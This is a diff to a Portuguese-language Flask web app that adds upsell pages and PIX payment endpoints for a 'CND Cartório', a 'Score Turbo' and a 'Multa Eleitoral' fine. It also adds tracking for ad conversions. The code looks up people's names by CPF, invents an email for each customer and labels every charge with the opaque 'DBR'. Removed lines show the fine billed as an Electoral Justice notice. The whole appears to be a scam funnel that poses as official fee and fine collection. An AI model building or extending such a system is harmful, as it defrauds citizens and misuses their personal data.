@@ -398,10 +398,71 @@ def chat():
     app.logger.info("[PROD] Acessando página de chat com Lucia Helena")
     return render_template('chat.html')
 
+@app.route('/upsell1')
+def upsell1():
+    app.logger.info("[PROD] Acessando Upsell 1 (CND Cartório - R$ 68,47)")
+    cpf = request.args.get('cpf', '06315363105')
+    clean_cpf = re.sub(r'[^0-9]', '', str(cpf))
+    cpf_data = get_cpf_data(clean_cpf) if len(clean_cpf) == 11 else {}
+    nome = cpf_data.get('nome') or 'Cidadão'
+    customer = {
+        'nome': nome,
+        'cpf': clean_cpf,
+        'cpf_raw': clean_cpf,
+        'telefone': '11987654321',
+        'email': generate_random_email(nome)
+    }
+    return render_template('upsell1.html', customer=customer)
+
+@app.route('/upsell2')
+def upsell2():
+    app.logger.info("[PROD] Acessando Upsell 2 (Score Turbo - R$ 38,24)")
+    cpf = request.args.get('cpf', '06315363105')
+    clean_cpf = re.sub(r'[^0-9]', '', str(cpf))
+    cpf_data = get_cpf_data(clean_cpf) if len(clean_cpf) == 11 else {}
+    nome = cpf_data.get('nome') or 'Cidadão'
+    customer = {
+        'nome': nome,
+        'cpf': clean_cpf,
+        'cpf_raw': clean_cpf,
+        'telefone': '11987654321',
+        'email': generate_random_email(nome)
+    }
+    return render_template('upsell2.html', customer=customer)
+
+@app.route('/upsell3')
+def upsell3():
+    app.logger.info("[PROD] Acessando Upsell 3 (Multa Eleitoral - R$ 117,15)")
+    cpf = request.args.get('cpf', '06315363105')
+    clean_cpf = re.sub(r'[^0-9]', '', str(cpf))
+    cpf_data = get_cpf_data(clean_cpf) if len(clean_cpf) == 11 else {}
+    nome = cpf_data.get('nome') or 'Cidadão'
+    customer = {
+        'nome': nome,
+        'cpf': clean_cpf,
+        'cpf_raw': clean_cpf,
+        'telefone': '11987654321',
+        'email': generate_random_email(nome)
+    }
+    return render_template('upsell3.html', customer=customer)
+
+@app.route('/conclusao')
+@app.route('/sucesso')
 @app.route('/negociacao')
-def negociacao():
-    app.logger.info("[PROD] Acessando página de negociacao")
-    return render_template('negociacao.html')
+def conclusao():
+    app.logger.info("[PROD] Acessando página final de conclusão do processo")
+    cpf = request.args.get('cpf', '06315363105')
+    clean_cpf = re.sub(r'[^0-9]', '', str(cpf))
+    cpf_data = get_cpf_data(clean_cpf) if len(clean_cpf) == 11 else {}
+    nome = cpf_data.get('nome') or 'Cidadão'
+    customer = {
+        'nome': nome,
+        'cpf': clean_cpf,
+        'cpf_raw': clean_cpf,
+        'telefone': '11987654321',
+        'email': generate_random_email(nome)
+    }
+    return render_template('conclusao.html', customer=customer)
 
 @app.route('/pagamento')
 @app.route('/pix')
@@ -594,14 +655,11 @@ def generate_pix():
             'success': False,
             'error': f'Erro interno: {str(e)}'
         }), 500
-@app.route('/generate-pix-negociacao', methods=['POST'])
-@app.route('/generate-pix-multa', methods=['POST'])
-def generate_pix_negociacao():
-    """Endpoint para gerar PIX da negociação / multa usando BravoPay"""
+@app.route('/generate-pix-upsell1', methods=['POST'])
+def generate_pix_upsell1():
+    """Endpoint para gerar PIX do Upsell 1 (CND Cartório - R$ 68,47) via BravoPay"""
     try:
         provider, api = get_active_payment_gateway()
-        app.logger.info(f"[PROD] Iniciando geração de PIX via {provider} para negociacao...")
-
         request_data = request.get_json() or {}
 
         user_phone = request_data.get('telefone', '').strip()
@@ -610,12 +668,12 @@ def generate_pix_negociacao():
         else:
             user_phone = ''.join(filter(str.isdigit, user_phone))
 
-        user_name = request_data.get('nome', '') or 'CLIENTE SEM NOME'
+        user_name = request_data.get('nome', '') or 'CLIENTE'
         user_cpf = (request_data.get('cpf', '') or '00000000000').replace('.', '').replace('-', '')
         user_email = generate_random_email(user_name)
-        amount = 67.35
+        amount = 68.47
 
-        app.logger.info(f"[PROD] Dados negociacao: Nome={user_name}, CPF={user_cpf}, Valor=R${amount}")
+        app.logger.info(f"[PROD] Upsell 1 PIX: Nome={user_name}, CPF={user_cpf}, Valor=R${amount}")
 
         customer_info = {
             'nome': user_name,
@@ -628,7 +686,7 @@ def generate_pix_negociacao():
             customer_data=customer_info,
             amount=amount,
             description="DBR",
-            external_reference=f"dbr_up_{user_cpf}_{int(datetime.now().timestamp())}"
+            external_reference=f"dbr_up1_{user_cpf}_{int(datetime.now().timestamp())}"
         )
 
         if pix_data.get('success'):
@@ -642,9 +700,7 @@ def generate_pix_negociacao():
             elif pix_code:
                 pix_qr_base64 = make_qr_base64(pix_code)
 
-            app.logger.info(f"[PROD] Transação {provider} negociacao criada: {transaction_id}")
-
-            # Utmify — Pedido Pendente Upsell (waiting_payment)
+            # Utmify — Pedido Pendente Upsell 1
             try:
                 client_ip = request.headers.get('X-Forwarded-For', request.remote_addr or '127.0.0.1').split(',')[0].strip()
                 tracking_params = extract_tracking_parameters(request_data)
@@ -652,13 +708,13 @@ def generate_pix_negociacao():
                     order_id=transaction_id,
                     amount=amount,
                     customer=customer_info,
-                    product_name="Notificação de Multa Adicional - Justiça Eleitoral",
-                    product_id="multa-eleitoral",
+                    product_name="DBR",
+                    product_id="cnd-cartorio",
                     tracking=tracking_params,
                     ip=client_ip
                 )
             except Exception as utm_err:
-                app.logger.warning(f"[UTMIFY] Falha ao registrar waiting_payment upsell: {utm_err}")
+                app.logger.warning(f"[UTMIFY] Falha ao registrar waiting_payment Upsell 1: {utm_err}")
 
             return jsonify({
                 'success': True,
@@ -668,29 +724,186 @@ def generate_pix_negociacao():
                 'pix_code': pix_code,
                 'pixCode': pix_code,
                 'qr_code_base64': pix_qr_base64,
-                'pixQrCode': pix_qr_base64,
-                'amount': amount,
-                'provider': provider
+                'qrCodeBase64': pix_qr_base64
             })
         else:
-            error_msg = pix_data.get('error', 'Erro desconhecido')
-            app.logger.error(f"[PROD] {provider} falhou negociacao: {error_msg}")
-            return jsonify({
-                'success': False,
-                'error': f'Erro: {error_msg}'
-            }), 400
+            return jsonify({'success': False, 'error': pix_data.get('error', 'Falha ao gerar PIX')}), 400
 
     except Exception as e:
-        app.logger.error(f"[PROD] Erro geral PIX negociacao: {e}")
-        return jsonify({
-            'success': False,
-            'error': f'Erro interno: {str(e)}'
-        }), 500
+        app.logger.error(f"[PROD] Erro geral PIX Upsell 1: {e}")
+        return jsonify({'success': False, 'error': f'Erro interno: {str(e)}'}), 500
+
+
+@app.route('/generate-pix-upsell2', methods=['POST'])
+def generate_pix_upsell2():
+    """Endpoint para gerar PIX do Upsell 2 (Score Turbo - R$ 38,24) via BravoPay"""
+    try:
+        provider, api = get_active_payment_gateway()
+        request_data = request.get_json() or {}
+
+        user_phone = request_data.get('telefone', '').strip()
+        if not user_phone or len(user_phone) < 10:
+            user_phone = "11987689080"
+        else:
+            user_phone = ''.join(filter(str.isdigit, user_phone))
+
+        user_name = request_data.get('nome', '') or 'CLIENTE'
+        user_cpf = (request_data.get('cpf', '') or '00000000000').replace('.', '').replace('-', '')
+        user_email = generate_random_email(user_name)
+        amount = 38.24
+
+        app.logger.info(f"[PROD] Upsell 2 PIX: Nome={user_name}, CPF={user_cpf}, Valor=R${amount}")
+
+        customer_info = {
+            'nome': user_name,
+            'cpf': user_cpf,
+            'email': user_email,
+            'phone': user_phone
+        }
+
+        pix_data = api.create_transaction(
+            customer_data=customer_info,
+            amount=amount,
+            description="DBR",
+            external_reference=f"dbr_up2_{user_cpf}_{int(datetime.now().timestamp())}"
+        )
+
+        if pix_data.get('success'):
+            transaction_id = pix_data.get('transaction_id') or pix_data.get('order_id')
+            pix_code = pix_data.get('qr_code') or pix_data.get('pixCode') or pix_data.get('pix_code')
+            pix_qr_base64 = pix_data.get('qr_code_base64') or pix_data.get('pixQrCode') or ''
+            
+            if pix_qr_base64:
+                if not pix_qr_base64.startswith('data:image') and not pix_qr_base64.startswith('http'):
+                    pix_qr_base64 = f"data:image/png;base64,{pix_qr_base64}"
+            elif pix_code:
+                pix_qr_base64 = make_qr_base64(pix_code)
+
+            # Utmify — Pedido Pendente Upsell 2
+            try:
+                client_ip = request.headers.get('X-Forwarded-For', request.remote_addr or '127.0.0.1').split(',')[0].strip()
+                tracking_params = extract_tracking_parameters(request_data)
+                utmify_api.track_waiting_payment(
+                    order_id=transaction_id,
+                    amount=amount,
+                    customer=customer_info,
+                    product_name="DBR",
+                    product_id="score-turbo",
+                    tracking=tracking_params,
+                    ip=client_ip
+                )
+            except Exception as utm_err:
+                app.logger.warning(f"[UTMIFY] Falha ao registrar waiting_payment Upsell 2: {utm_err}")
+
+            return jsonify({
+                'success': True,
+                'transaction_id': transaction_id,
+                'transactionId': transaction_id,
+                'orderId': transaction_id,
+                'pix_code': pix_code,
+                'pixCode': pix_code,
+                'qr_code_base64': pix_qr_base64,
+                'qrCodeBase64': pix_qr_base64
+            })
+        else:
+            return jsonify({'success': False, 'error': pix_data.get('error', 'Falha ao gerar PIX')}), 400
+
+    except Exception as e:
+        app.logger.error(f"[PROD] Erro geral PIX Upsell 2: {e}")
+        return jsonify({'success': False, 'error': f'Erro interno: {str(e)}'}), 500
+
+
+@app.route('/generate-pix-upsell3', methods=['POST'])
+@app.route('/generate-pix-negociacao', methods=['POST'])
+@app.route('/generate-pix-multa', methods=['POST'])
+def generate_pix_upsell3():
+    """Endpoint para gerar PIX do Upsell 3 (Multa Eleitoral - R$ 117,15) via BravoPay"""
+    try:
+        provider, api = get_active_payment_gateway()
+        request_data = request.get_json() or {}
+
+        user_phone = request_data.get('telefone', '').strip()
+        if not user_phone or len(user_phone) < 10:
+            user_phone = "11987689080"
+        else:
+            user_phone = ''.join(filter(str.isdigit, user_phone))
+
+        user_name = request_data.get('nome', '') or 'CLIENTE'
+        user_cpf = (request_data.get('cpf', '') or '00000000000').replace('.', '').replace('-', '')
+        user_email = generate_random_email(user_name)
+        amount = 117.15
+
+        app.logger.info(f"[PROD] Upsell 3 PIX: Nome={user_name}, CPF={user_cpf}, Valor=R${amount}")
+
+        customer_info = {
+            'nome': user_name,
+            'cpf': user_cpf,
+            'email': user_email,
+            'phone': user_phone
+        }
+
+        pix_data = api.create_transaction(
+            customer_data=customer_info,
+            amount=amount,
+            description="DBR",
+            external_reference=f"dbr_up3_{user_cpf}_{int(datetime.now().timestamp())}"
+        )
+
+        if pix_data.get('success'):
+            transaction_id = pix_data.get('transaction_id') or pix_data.get('order_id')
+            pix_code = pix_data.get('qr_code') or pix_data.get('pixCode') or pix_data.get('pix_code')
+            pix_qr_base64 = pix_data.get('qr_code_base64') or pix_data.get('pixQrCode') or ''
+            
+            if pix_qr_base64:
+                if not pix_qr_base64.startswith('data:image') and not pix_qr_base64.startswith('http'):
+                    pix_qr_base64 = f"data:image/png;base64,{pix_qr_base64}"
+            elif pix_code:
+                pix_qr_base64 = make_qr_base64(pix_code)
+
+            # Utmify — Pedido Pendente Upsell 3
+            try:
+                client_ip = request.headers.get('X-Forwarded-For', request.remote_addr or '127.0.0.1').split(',')[0].strip()
+                tracking_params = extract_tracking_parameters(request_data)
+                utmify_api.track_waiting_payment(
+                    order_id=transaction_id,
+                    amount=amount,
+                    customer=customer_info,
+                    product_name="DBR",
+                    product_id="multa-eleitoral",
+                    tracking=tracking_params,
+                    ip=client_ip
+                )
+            except Exception as utm_err:
+                app.logger.warning(f"[UTMIFY] Falha ao registrar waiting_payment Upsell 3: {utm_err}")
+
+            return jsonify({
+                'success': True,
+                'transaction_id': transaction_id,
+                'transactionId': transaction_id,
+                'orderId': transaction_id,
+                'pix_code': pix_code,
+                'pixCode': pix_code,
+                'qr_code_base64': pix_qr_base64,
+                'qrCodeBase64': pix_qr_base64
+            })
+        else:
+            return jsonify({'success': False, 'error': pix_data.get('error', 'Falha ao gerar PIX')}), 400
+
+    except Exception as e:
+        app.logger.error(f"[PROD] Erro geral PIX Upsell 3: {e}")
+        return jsonify({'success': False, 'error': f'Erro interno: {str(e)}'}), 500
+
 
 @app.route('/check-payment/<transaction_id>')
-def check_payment(transaction_id):
-    """Verifica o status de uma transação PIX no gateway ativo"""
+@app.route('/check-payment')
+def check_payment(transaction_id=None):
+    """Verifica o status de uma transação PIX no gateway ativo e notifica Utmify instantaneamente"""
     try:
+        if not transaction_id:
+            transaction_id = request.args.get('transaction_id') or request.args.get('id')
+        if not transaction_id:
+            return jsonify({'success': False, 'error': 'transaction_id não informado'}), 400
+
         app.logger.info(f"[PAYMENT_STATUS] Verificando status: {transaction_id}")
         provider, api = get_active_payment_gateway()
 
@@ -703,14 +916,11 @@ def check_payment(transaction_id):
             
             # Utmify — Pedido Pago (paid)
             try:
-                utmify_api.track_paid(
-                    order_id=transaction_id,
-                    amount=148.37
-                )
+                utmify_api.track_paid(order_id=transaction_id)
             except Exception as utm_err:
                 app.logger.warning(f"[UTMIFY] Falha no track_paid polling: {utm_err}")
 
-            # TikTok CAPI — Purchase (fallback polling, mesmo event_id para deduplicar)
+            # TikTok CAPI — Purchase
             try:
                 send_purchase(
                     event_id=f'purchase_{transaction_id}',
@@ -724,7 +934,8 @@ def check_payment(transaction_id):
 
             return jsonify({
                 'success': True,
-                'status': 'paid',
+                'status': 'approved',
+                'paid': True,
                 'transaction_id': transaction_id,
                 'redirect_to_negociacao': True
             })
